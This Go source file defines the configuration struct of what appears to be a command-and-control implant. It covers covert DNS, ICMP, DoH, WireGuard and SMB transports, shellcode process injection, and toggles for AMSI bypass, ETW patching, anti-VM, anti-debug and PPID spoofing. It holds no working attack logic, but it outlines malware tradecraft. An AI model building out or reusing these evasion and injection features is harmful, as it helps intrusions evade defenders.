package core

type Config struct {
	DefaultURL      string
	DefaultProfile  string
	ServerPubKeyPem string
	ClientCertPem   string
	ClientKeyPem    string
	RootCAPem       string
	ProfileJSON     string
	AgentPrivKeyPem string
	TransportMode   string

	DNSDomain   string
	DNSResolver string

	DNSVerbB            string
	DNSVerbT            string
	DNSVerbR            string
	DNSPayloadChunkSize int

	ICMPHost string

	DoHResolver   string
	DoHHostHeader string
	DoHUserAgent  string

	WebSocketURL string

	WireGuardServerPubKey string
	WireGuardServerAddr   string
	WireGuardAgentPrivKey string
	WireGuardTunnelIP     string
	WireGuardServerTunnelIP string
	WireGuardInnerPort string

	PivotPrivKeyB64 string
	PivotPubKeyB64  string

	SMBPipe         string
	SMBRelayPipe    string

	TCPBindAddr     string
	TCPBindToken    string
	TCPRelayTarget  string
	TCPRelayToken   string

	TCPRevListen string
	TCPRevTarget string
	TCPRevToken  string

	TransportFailoverAfter int
	KillDays               int
	DefaultSleepSeconds    int
	DefaultJitter          float64
	WorkHoursStart         int
	WorkHoursEnd           int

	ServerECDHPubkey  string
	ObfKeyHex         string
	TLSProfile        string
	SleepMaskType     string
	SyscallMethod     string

	InjectorShellcodeB64 string

	// InjectMethod is the default `migrate <pid>` method when no
	// --method flag is supplied. Empty or "default" selects the
	// platform's historical path — CreateRemoteThread on Windows,
	// ptrace on Linux. "apc" selects remote APC injection on
	// Windows; it is refused on Linux by inject_linux.go.
	InjectMethod string

	Verbose           bool
	AntiSandbox       bool
	AntiDebug         bool
	AntiVM            bool
	PpidSpoof         bool
	AmsiBypass        bool
	EtwPatch          bool
	SleepMask         bool
	StringObfuscation bool
}